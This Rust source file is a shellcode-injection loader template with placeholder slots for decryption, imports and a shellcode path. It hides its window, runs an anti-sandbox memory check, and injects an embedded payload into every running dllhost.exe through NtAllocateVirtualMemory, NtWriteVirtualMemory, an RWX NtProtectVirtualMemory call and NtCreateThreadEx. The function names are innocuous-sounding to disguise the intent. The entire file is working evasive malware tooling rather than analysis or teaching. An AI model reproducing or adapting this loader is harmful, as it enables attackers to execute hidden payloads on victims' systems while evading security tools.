#![windows_subsystem = "windows"]

use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use std::include_bytes;

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, GENERIC_ALL},
        lmaccess::{ACCESS_ALL}
    },
    shared::{
        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
    }
};
use winapi::ctypes::c_void;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use std::{ptr::null_mut};
use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntpsapi::NtOpenProcess;
use ntapi::ntmmapi::NtAllocateVirtualMemory;
use ntapi::ntmmapi::NtWriteVirtualMemory;
use ntapi::ntmmapi::NtProtectVirtualMemory;
use ntapi::ntpsapi::NtCreateThreadEx;
use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;


{{IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn boxboxbox(tar: &str) -> Vec<usize> {
    // search for processes to inject into
    let mut dom: Vec<usize> = Vec::new();
    let s = System::new_all();
    for pro in s.processes_by_exact_name(tar) {
        //println!("{} {}", pro.pid(), pro.name());
        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
    }
    return dom;
}

fn enhance(mut buf: Vec<u8>, tar: usize) {
    // injecting in target processes :)
    let mut process_handle = tar as HANDLE;
    let mut oa = OBJECT_ATTRIBUTES::default();
    let mut ci = CLIENT_ID {
        UniqueProcess: process_handle,
        UniqueThread: null_mut(),
    };

    unsafe {

        //let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, *tar).unwrap();
        let open_status = NtOpenProcess(&mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
        if !NT_SUCCESS(open_status) {
            panic!("Error opening process: {}", open_status);
        }
        //let result_ptr = VirtualAllocEx(h_process, None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
        let mut allocstart : *mut c_void = null_mut();
        let mut size : usize = buf.len();
        let alloc_status = NtAllocateVirtualMemory(process_handle, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(alloc_status) {
            panic!("Error allocating memory to the target process: {}", alloc_status);
        }
        let mut byteswritten = 0;
        let buffer = buf.as_mut_ptr() as *mut c_void;
        let mut buffer_length = buf.len();
        let write_status = NtWriteVirtualMemory(process_handle, allocstart, buffer, buffer_length, &mut byteswritten);
        if !NT_SUCCESS(write_status) {
            panic!("Error writing to the target process: {}", write_status);
        }
        /*let _resb = WriteProcessMemory(
            h_process,
            result_ptr,
            buf.as_ptr() as _,
            buf.len(),
            Some(&mut byteswritten),
        );
        */
        let mut old_perms = PAGE_READWRITE;
        let protect_status = NtProtectVirtualMemory(process_handle, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
        if !NT_SUCCESS(protect_status) {
            panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
        }
        /* 
        let _bool = VirtualProtectEx(
            h_process,
            result_ptr,
            buf.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_perms,
        );
        */
        let mut thread_handle : *mut c_void = null_mut();
        let handle = process_handle as *mut c_void;
        let write_thread = NtCreateThreadEx(&mut thread_handle, GENERIC_ALL, null_mut(), handle, allocstart, null_mut(), 0, 0, 0, 0, null_mut());
        //let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, lol1, handle, allocstart, lol2, 0, 0, 0, 0, lol3);

        if !NT_SUCCESS(write_thread) {
            panic!("Error failed to create remote thread: {}", write_thread);
        }
    }
}

fn main() {
    // inject in the following processes:
    let tar: &str = "dllhost.exe";

    let mut memory = 0;
    unsafe {
        let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
        println!("{:#?}", is_quicksand);
        if is_quicksand != 1 {
            panic!("Hello.")
        }
    }

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    let list: Vec<usize> = boxboxbox(tar);
    if list.len() == 0 {
        panic!("[-] Unable to find a process.")
    } else {
        for i in &list {
            {{MAIN}}
            enhance(vec.clone(), *i);
        }
    }
}
